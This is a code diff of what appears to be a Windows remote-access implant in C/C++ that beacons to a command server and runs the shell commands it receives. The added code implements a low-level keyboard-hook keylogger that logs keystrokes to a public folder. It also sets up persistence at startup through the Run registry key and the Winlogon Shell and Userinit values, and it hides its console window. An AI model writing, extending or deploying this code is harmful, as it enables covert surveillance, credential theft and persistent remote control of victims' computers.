@@ -4,6 +4,7 @@
 #include <unistd.h>
 #include <stdbool.h>
 #include <fcntl.h>
+#include <string>
 
 #ifdef _WIN32
     #define SECURITY_WIN32
@@ -13,11 +14,7 @@
     #include <security.h>
     #include <schannel.h>
     #include <fcntl.h>
-    #include "./includes/persistance.h"
-    
-    extern "C" {
-        DWORD WINAPI StartWindowsKeylogger(LPVOID arg);
-    }
+
     #define file_path "z:\\tmp\\id"       //"\\windows\\Temp\\id" 
     SOCKET sock = INVALID_SOCKET;
     CredHandle hCred;
@@ -157,6 +154,106 @@ class Communicate_ {
     void download();
 };
 
+class Keylogger {
+    public:
+    #ifdef _WIN32
+        inline static  char keyloggerfile[256] = "C:\\Users\\Public\\log.txt";
+        static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+            int keyCount = 0;
+            if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
+                DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
+                FILE* file;
+                fopen_s(&file, keyloggerfile, "a");
+                if (file != NULL) {
+                    fprintf(file, "%lu", vkCode);
+                    fclose(file);
+                }
+                keyCount++;
+                }
+                return CallNextHookEx(NULL, nCode, wParam, lParam);
+            }
+        
+            DWORD WINAPI StartWindowsKeylogger(LPVOID arg) {
+                HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+                // wait for events
+                MSG msg;
+                while (GetMessage(&msg, NULL, 0, 0) > 0) {
+                    TranslateMessage(&msg);
+                    DispatchMessage(&msg);
+                }
+                // delete hook
+                UnhookWindowsHookEx(hook);
+                return 0;
+            }
+        
+    #else
+    #endif
+};
+
+#ifdef _WIN32
+class WindowsPersistence {
+    
+    private:
+    string exePath;
+    public:
+    // Constructor
+    WindowsPersistence(string exePath) {
+        this->exePath = exePath;
+    }
+    // Getters
+    string getExePath() {
+        return this->exePath;
+    }
+    // Setters
+    void setExePath(string exePath) {
+        this->exePath = exePath;
+    }
+    // Persistence Methods
+    // Register Run
+    bool persistenceByRunReg(){
+        HKEY hkey = NULL;
+        LONG res = RegOpenKeyEx(HKEY_CURRENT_USER,(LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
+    if (res == ERROR_SUCCESS) {
+        RegSetValueEx(hkey,(LPCSTR)"salsa", 0, REG_SZ, (unsigned char*)this->exePath.c_str(), strlen(this->exePath.c_str()));
+    if (RegCloseKey(hkey) == ERROR_SUCCESS) {
+        return true;
+    }
+        RegCloseKey(hkey);
+    }
+    return false;
+    }
+    // Register Winlogon
+    bool persistenceByWinlogon(){
+        HKEY hkey = NULL;
+        LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &hkey);
+    if (res == ERROR_SUCCESS) {
+        RegSetValueEx(hkey,(LPCSTR)"Shell", 0, REG_SZ, (unsigned char*)this->exePath.c_str(), strlen(this->exePath.c_str()));
+    if (RegCloseKey(hkey) == ERROR_SUCCESS) {
+        return true;
+    }
+        RegCloseKey(hkey);
+    }
+    return false;
+    }
+    // Persistence by Winlogon
+    bool persistenceByWinlogonReg(){
+        HKEY hkey = NULL;
+        LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &hkey);
+        if (res == ERROR_SUCCESS) {
+            RegSetValueEx(hkey,(LPCSTR)"Userinit", 0, REG_SZ, (unsigned char*)this->exePath.c_str(), strlen(this->exePath.c_str()));
+        if (RegCloseKey(hkey) == ERROR_SUCCESS) {
+            return true;
+        }
+        RegCloseKey(hkey);
+        }
+        return false;
+    }
+};
+#endif
+
+
+
+
 #ifdef _WIN32
 void Device::hideConsole() {
     HWND stealth;
@@ -205,6 +302,25 @@ int jitter() {
 int main() {
     Communicate_ comm;
     Device d;
+    
+    #ifdef _WIN32
+        char path[0x100];
+        GetModuleFileNameA(NULL, path, 0x100);
+
+        WindowsPersistence p = WindowsPersistence(path);
+        
+        if (p.persistenceByRunReg()) {
+            goto START;
+        } else if (p.persistenceByWinlogon()) {
+            goto START;
+        } else if (p. persistenceByWinlogonReg()) {
+            goto START;
+        }
+
+    #endif
+    // persistance
+    
+    START:
 
     #ifdef _WIN32
     d.hideConsole();
@@ -482,7 +598,7 @@ void Communicate_::beacon(const char *id) {
         download();
     } else if (strncmp(cmd->valuestring, "keylogger", 9) == 0) {
         #ifdef _WIN32
-            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartWindowsKeylogger, NULL, 0, NULL);
+            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Keylogger::StartWindowsKeylogger, NULL, 0, NULL);
             WaitForSingleObject(hThread, INFINITE);
             CloseHandle(hThread);
             strcpy(result, "Started Windows keylogger successfully");
@@ -511,7 +627,7 @@ void Communicate_::beacon(const char *id) {
         cJSON_Delete(re);
         free(result_);
         return;
-    }   
+    }
 
     memset(buffer, 0, sizeof(buffer));
     snprintf(command_with_redirect, sizeof(command_with_redirect), "%s 2>&1", cmd->valuestring);
